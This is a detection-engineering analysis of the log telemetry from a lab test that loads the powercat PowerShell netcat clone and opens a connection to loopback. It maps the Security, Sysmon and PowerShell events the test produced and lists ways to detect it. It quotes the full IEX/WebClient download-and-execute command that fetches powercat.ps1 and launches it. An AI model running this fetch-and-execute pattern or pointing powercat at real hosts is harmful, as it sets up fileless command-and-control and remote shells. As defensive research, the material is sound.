# T1095-3: Non-Application Layer Protocol — Powercat C2

## Technique Context

T1095 (Non-Application Layer Protocol) covers adversary C2 communications that bypass application-layer monitoring. Powercat is a PowerShell-native implementation of netcat: it provides raw TCP/UDP socket communication, reverse shell capability, and file transfer functionality entirely within the PowerShell runtime, without dropping a separate binary to disk. This makes powercat distinctively stealthy compared to deploying `ncat.exe` — the payload lives only in memory, loaded via `IEX` from a remote URL.

In real intrusions, powercat is commonly used to establish reverse shells back to attacker infrastructure, port-forward internal services through a compromised host, and exfiltrate files via raw TCP/UDP. Its pure-PowerShell implementation means endpoint controls that focus on executable-based detection miss it entirely; detection depends on script content analysis, network traffic monitoring, or behavioral analysis of raw TCP connections.

The test downloads `powercat.ps1` from a pinned GitHub commit via `IEX (New-Object System.Net.Webclient).Downloadstring(...)`, then executes `powercat -c 127.0.0.1 -p 80` — connecting to loopback port 80 as a safe lab demonstration of the C2 connection setup.

## What This Dataset Contains

The dataset spans approximately ten seconds (2026-03-14T23:39:09Z–23:39:18Z) on ACME-WS06.acme.local and contains 141 events across three channels.

**The core execution command** is captured in Security EID 4688 (PowerShell):

```
"powershell.exe" & {IEX (New-Object System.Net.Webclient).Downloadstring(
  'https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c 127.0.0.1 -p 80}
```

With Defender disabled, this download-and-execute pattern proceeds without AMSI interception. The URL is pinned to a specific commit hash of the official powercat repository on GitHub. After loading, `powercat -c 127.0.0.1 -p 80` connects (-c) to 127.0.0.1 on port (-p) 80. In a real attack scenario, `-c` would be an attacker-controlled IP and `-p` would be a C2 listener port.

**Security EID 4688** (4 events) shows:
- `whoami.exe` (twice) — test framework environment checks
- PowerShell with the full IEX/powercat command line
- Cleanup PowerShell `& {}`

All execute as `NT AUTHORITY\SYSTEM`.

**Sysmon EID 1** (3 events):
- `whoami.exe` (PID 3020, rule `T1033`, parent powershell.exe PID 3112)
- `whoami.exe` (PID 1552, rule `T1033`, parent powershell.exe PID 3112) — second test framework check post-test

Note that the PowerShell process executing the powercat download is not captured in the 3-event EID 1 sample from Sysmon; the Security channel provides the command line.

**Sysmon EID 8** (1 event, CreateRemoteThread): `technique_id=T1055,technique_name=Process Injection`. The source process is PowerShell (PID 1304) creating a remote thread in a target process (PID not shown in sample snippet). This is a critical event: powercat's PowerShell implementation uses `System.Net.Sockets` calls that can trigger Sysmon's CreateRemoteThread detection when the .NET runtime interacts with certain socket APIs or when PowerShell's script execution crosses process memory boundaries. This EID 8 event distinguishes powercat from the simpler netcat test (T1095-2) and the ICMP test (T1095-1), neither of which generated EID 8 events.

**Sysmon EID 7** (17 events) records DLL loads for the PowerShell session.

**Sysmon EID 10** (3 events) shows PowerShell accessing child processes with 0x1FFFFF.

**Sysmon EID 17** (2 events) records named pipe creation from PowerShell.

**Sysmon EID 11** (2 events) captures PowerShell startup profile data file creation.

**PowerShell EID 4104** (104 events), **EID 4103** (3 events), and **EID 4100** (2 events) document the session. EID 4100 is a PowerShell engine lifecycle event (engine start/stop); the two instances here correspond to the test and cleanup PowerShell sessions. EID 4103 captures pipeline execution detail including `Write-Host "DONE"` at completion.

## What This Dataset Does Not Contain

No Sysmon EID 3 (network connection) events appear. The loopback destination (127.0.0.1) is intentional for lab safety; Sysmon does not capture loopback connections. In a real deployment with an external C2 address, EID 3 would capture the TCP connection including destination IP and port.

The powercat script content downloaded via `IEX` is not directly captured in EID 4104 as a separate script block. The `IEX` invocation is logged, but the content of the downloaded `powercat.ps1` script is not re-logged as a new script block unless PowerShell decompiles and re-logs it separately — a gap in IEX-based in-memory execution logging.

No Defender blocking, AMSI detection, or quarantine events exist — the entire test ran without interference with Defender disabled.

## Assessment

With Defender disabled, the powercat download-and-execute pattern ran successfully and generated a notably richer Sysmon event set than the binary-based netcat test (T1095-2). The Sysmon EID 8 CreateRemoteThread event is the most distinctive finding: powercat's in-memory socket operations trigger a process injection detection rule that ncat.exe does not. This creates an interesting asymmetry — the fileless, "stealthier" tool (powercat) generates a higher-severity Sysmon alert (EID 8, T1055) than the binary-based tool (ncat), which only generates process creation events.

Compared to the defended variant (35 Sysmon, 9 Security, 41 PowerShell), the undefended dataset is slightly smaller in Sysmon (28 vs. 35) and Security (4 vs. 9) but larger in PowerShell (109 vs. 41). The defended run's additional Sysmon events likely include Defender process activity. The undefended PowerShell channel is substantially larger, reflecting fuller script block coverage without AMSI interference.

Crucially, the defended variant blocked powercat before the EID 8 CreateRemoteThread event could occur. This dataset — where Defender is disabled and powercat runs to completion — is the only place this EID 8 artifact appears, making it uniquely valuable for developing detection logic around powercat's in-memory socket behavior.

## Detection Opportunities Present in This Data

**IEX + WebClient download of powercat**: Security EID 4688 preserves the full command line including the GitHub URL pinned to the powercat repository. The string `powercat.ps1` or the besimorhino GitHub URL in a PowerShell command line is an unambiguous indicator. Searching EID 4688 command lines and EID 4104 script block content for `powercat` provides immediate hits.

**Sysmon EID 8 CreateRemoteThread from PowerShell**: The T1055 (Process Injection) rule hit from a PowerShell source process creating a remote thread is a high-fidelity behavioral indicator for in-memory socket tools. Powercat's use of raw .NET socket APIs triggers this in a way that distinguishes it from standard PowerShell cmdlet usage.

**IEX pattern with Webclient and immediate function call**: The pattern `IEX (...).Downloadstring('url') functionname -args` is a characteristic living-off-the-land execution pattern. The download URL, function name (`powercat`), and arguments (`-c` IP `-p` port) are all captured in the Security EID 4688 command line.

**PowerShell EID 4100 engine lifecycle events**: The two EID 4100 events mark PowerShell session starts. Correlating EID 4100 session starts with subsequent anomalous EID 4104 content (IEX downloads, tool invocations) provides a session-scoped view of the attack activity.
